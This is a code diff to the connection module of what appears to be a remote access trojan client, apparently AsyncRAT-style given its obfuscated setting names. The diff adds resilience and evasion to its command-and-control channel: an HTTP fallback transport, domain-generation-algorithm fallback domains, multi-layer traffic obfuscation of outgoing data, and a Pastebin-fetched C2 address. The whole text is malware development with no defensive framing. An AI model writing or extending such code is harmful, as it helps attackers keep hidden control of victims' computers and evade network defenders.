@@ -19,6 +19,8 @@ namespace Client.Connection
 {
     public static class ClientSocket
     {
+        private static TransportManager transportManager;
+        private static ConnectionResilience connectionResilience;
         public static Socket TcpClient { get; set; } //Main socket
         public static SslStream SslClient { get; set; } //Main SSLstream
         private static byte[] Buffer { get; set; } //Socket buffer
@@ -30,64 +32,82 @@ namespace Client.Connection
         private static Timer Ping { get; set; } //Send ping interval
         public static int Interval { get; set; } //ping value
         public static bool ActivatePo_ng { get; set; }
+        private static int reconnectAttempts = 0;
+        private static readonly int maxReconnectAttempts = 5;
 
         public static List<MsgPack> Packs = new List<MsgPack>();
 
-        public static void InitializeClient() //Connect & reconnect
+        public static void InitializeClient() //Connect & reconnect with TransportManager
         {
             try
             {
-
-                TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
+                // Initialize TransportManager and ConnectionResilience
+                if (transportManager == null)
                 {
-                    ReceiveBufferSize = 50 * 1024,
-                    SendBufferSize = 50 * 1024,
-                };
+                    transportManager = new TransportManager();
+                    transportManager.AddTransport(new TcpTransport());
+                    transportManager.AddTransport(new HttpTransport());
+                    
+                    connectionResilience = new ConnectionResilience();
+                }
+
+                string targetHost;
+                int targetPort;
 
                 if (Settings.Paste_bin == "null")
                 {
-                    string ServerIP = Settings.Hos_ts.Split(',')[new Random().Next(Settings.Hos_ts.Split(',').Length)];
-                    int ServerPort = Convert.ToInt32(Settings.Por_ts.Split(',')[new Random().Next(Settings.Por_ts.Split(',').Length)]);
+                    // Parse hosts and ports
+                    string[] hosts = Settings.Hos_ts.Split(',');
+                    string[] ports = Settings.Por_ts.Split(',');
 
-                    if (IsValidDomainName(ServerIP)) 
+                    // Add to ConnectionResilience
+                    foreach (string host in hosts)
                     {
-                        IPAddress[] addresslist = Dns.GetHostAddresses(ServerIP); 
+                        connectionResilience.AddPrimaryHost(host.Trim());
+                    }
+                    foreach (string port in ports)
+                    {
+                        connectionResilience.AddPort(Convert.ToInt32(port.Trim()));
+                    }
 
-                        foreach (IPAddress theaddress in addresslist) 
-                        {
-                            try
-                            {
-                                TcpClient.Connect(theaddress, ServerPort); 
-                                if (TcpClient.Connected) break;
-                            }
-                            catch { }
-                        }
-                    }
-                    else
-                    {
-                        TcpClient.Connect(ServerIP, ServerPort); 
-                    }
+                    // Get next target from ConnectionResilience
+                    var target = connectionResilience.GetNextTarget();
+                    targetHost = target.Item1;
+                    targetPort = target.Item2;
                 }
                 else
                 {
+                    // Pastebin config
                     using (WebClient wc = new WebClient())
                     {
                         NetworkCredential networkCredential = new NetworkCredential("", "");
                         wc.Credentials = networkCredential;
                         string resp = wc.DownloadString(Settings.Paste_bin);
                         string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
-                        Settings.Hos_ts = spl[0];
-                        Settings.Por_ts = spl[new Random().Next(1, spl.Length)];
-                        TcpClient.Connect(Settings.Hos_ts, Convert.ToInt32(Settings.Por_ts));
+                        targetHost = spl[0];
+                        targetPort = Convert.ToInt32(spl[new Random().Next(1, spl.Length)]);
                     }
                 }
 
-                if (TcpClient.Connected)
+                // Try to connect using TransportManager
+                bool connected = transportManager.Connect(targetHost, targetPort);
+
+                if (connected && transportManager.IsConnected)
                 {
-                    //Debug.WriteLine("Connected!");
+                    //Debug.WriteLine("Connected via " + transportManager.GetCurrentTransportType());
+                    reconnectAttempts = 0;
                     IsConnected = true;
-                    SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
-                    SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
+
+                    // Get socket and SSL stream from current transport
+                    ITransport currentTransport = transportManager.GetCurrentTransport();
+                    TcpClient = currentTransport.GetSocket();
+                    
+                    if (currentTransport is TcpTransport)
+                    {
+                        SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
+                        SslClient.AuthenticateAsClient(targetHost, null, SslProtocols.Tls12 | SslProtocols.Tls13, false);
+                    }
+
                     HeaderSize = 4;
                     Buffer = new byte[HeaderSize];
                     Offset = 0;
@@ -96,17 +116,37 @@ namespace Client.Connection
                     ActivatePo_ng = false;
                     KeepAlive = new Timer(new TimerCallback(KeepAlivePacket), null, new Random().Next(10 * 1000, 15 * 1000), new Random().Next(10 * 1000, 15 * 1000));
                     Ping = new Timer(new TimerCallback(Po_ng), null, 1, 1);
-                    SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
+                    
+                    if (SslClient != null)
+                        SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
                 }
                 else
                 {
+                    reconnectAttempts++;
                     IsConnected = false;
+                    
+                    // Apply exponential backoff
+                    if (reconnectAttempts < maxReconnectAttempts)
+                    {
+                        connectionResilience.RecordFailure(targetHost, targetPort);
+                    }
+                    else
+                    {
+                        // Try DGA fallback domains
+                        reconnectAttempts = 0;
+                        string[] dgaDomains = DomainGenerator.GetFallbackDomains();
+                        foreach (string domain in dgaDomains)
+                        {
+                            connectionResilience.AddFallbackHost(domain);
+                        }
+                    }
                     return;
                 }
             }
-            catch
+            catch (Exception ex)
             {
-                //Debug.WriteLine("Disconnected!");
+                //Debug.WriteLine("Connection failed: " + ex.Message);
+                reconnectAttempts++;
                 IsConnected = false;
                 return;
             }
@@ -127,13 +167,13 @@ namespace Client.Connection
 
         public static void Reconnect()
         {
-
             try
             {
                 Ping?.Dispose();
                 KeepAlive?.Dispose();
                 SslClient?.Dispose();
                 TcpClient?.Dispose();
+                transportManager?.Disconnect();
             }
             catch { }
             IsConnected = false;
@@ -221,31 +261,42 @@ namespace Client.Connection
                         return;
                     }
 
-                    byte[] buffersize = BitConverter.GetBytes(msg.Length);
-                    TcpClient.Poll(-1, SelectMode.SelectWrite);
-                    SslClient.Write(buffersize, 0, buffersize.Length);
+                    // Apply traffic obfuscation
+                    byte[] obfuscatedMsg = TrafficObfuscator.ApplyMultiLayerObfuscation(msg);
 
-                    if (msg.Length > 1000000) //1mb
+                    byte[] buffersize = BitConverter.GetBytes(obfuscatedMsg.Length);
+                    TcpClient.Poll(-1, SelectMode.SelectWrite);
+                    
+                    if (SslClient != null)
                     {
-                        //Debug.WriteLine("send chunks");
-                        using (MemoryStream memoryStream = new MemoryStream(msg))
+                        SslClient.Write(buffersize, 0, buffersize.Length);
+
+                        if (obfuscatedMsg.Length > 1000000) //1mb
                         {
-                            int read = 0;
-                            memoryStream.Position = 0;
-                            byte[] chunk = new byte[50 * 1000];
-                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
+                            //Debug.WriteLine("send chunks");
+                            using (MemoryStream memoryStream = new MemoryStream(obfuscatedMsg))
                             {
-                                TcpClient.Poll(-1, SelectMode.SelectWrite);
-                                SslClient.Write(chunk, 0, read);
-                                SslClient.Flush();
+                                int read = 0;
+                                memoryStream.Position = 0;
+                                byte[] chunk = new byte[50 * 1000];
+                                while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
+                                {
+                                    TcpClient.Poll(-1, SelectMode.SelectWrite);
+                                    SslClient.Write(chunk, 0, read);
+                                    SslClient.Flush();
+                                }
                             }
                         }
+                        else
+                        {
+                            TcpClient.Poll(-1, SelectMode.SelectWrite);
+                            SslClient.Write(obfuscatedMsg, 0, obfuscatedMsg.Length);
+                            SslClient.Flush();
+                        }
                     }
-                    else
+                    else if (transportManager != null)
                     {
-                        TcpClient.Poll(-1, SelectMode.SelectWrite);
-                        SslClient.Write(msg, 0, msg.Length);
-                        SslClient.Flush();
+                        transportManager.Send(obfuscatedMsg);
                     }
                 }
                 catch
